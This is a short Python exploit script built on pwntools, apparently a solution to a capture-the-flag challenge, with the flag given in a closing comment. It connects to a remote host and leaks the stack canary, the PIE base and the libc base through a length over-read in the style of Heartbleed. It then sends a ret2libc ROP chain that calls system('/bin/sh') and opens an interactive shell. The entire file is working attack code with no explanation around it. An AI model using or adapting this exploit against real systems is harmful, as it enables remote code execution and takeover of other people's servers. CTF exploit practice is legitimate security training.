from pwn import *
#libc = ELF('/usr/lib/libc.so.6', checksec=False)
libc = ELF('libc-2.31.so', checksec=False)
elf = ELF('./server', checksec=False)
def sendPayload(sz, data, retval=False):
    # 0x00001211      ba04000000     mov edx, 4
    # take 4 bytes
    p.send(b'%s' % p32(sz))
    p.sendline(b'%s' % data)
    if retval:
        # 0x0000124a      ba0a000000     mov edx, 0xa
        p.recvline_contains('you said: ')
        return p.recv(sz)

#p = elf.process()
p = remote('104.248.146.184',10001)

# leak canary, pie, libc
canary      = u64(sendPayload(0x400 + 8*2, b'gg', retval=True)[-8:])
elf.address = u64(sendPayload(0x400 + 8*4, b'gg', retval=True)[-8:]) - (elf.sym['main']+58)
libc_leak   = u64(sendPayload(0x400 + 8*6, b'gg', retval=True)[-8:])
libc.address = eval(hex(libc_leak - libc.sym['__libc_start_main'])[:-3] + '000')

log.info(f'canary                @ 0x{canary:x}')
log.info(f'pie base              @ 0x{elf.address:x}')
log.info(f'__libc_start_main+242 @ 0x{libc_leak:x}')
log.info(f'libc base             @ 0x{libc.address:x}')

# typical ret2libc
payload = b''.join([
    p64(canary),
    p64(0),
    p64(elf.address + 0x000000000000101a), # ret
    p64(elf.address + 0x0000000000001343), # pop rdi
    p64(next(libc.search(b'/bin/sh'))),
    p64(libc.sym['system'])
])

sendPayload(0x400 + 8 + len(payload), b'A'*(0x400+8) + payload)
sendPayload(0xffffffff, b'pwn')

p.interactive()
# Arkav7{it5_ju5t_l1k3_h34rtbl33d}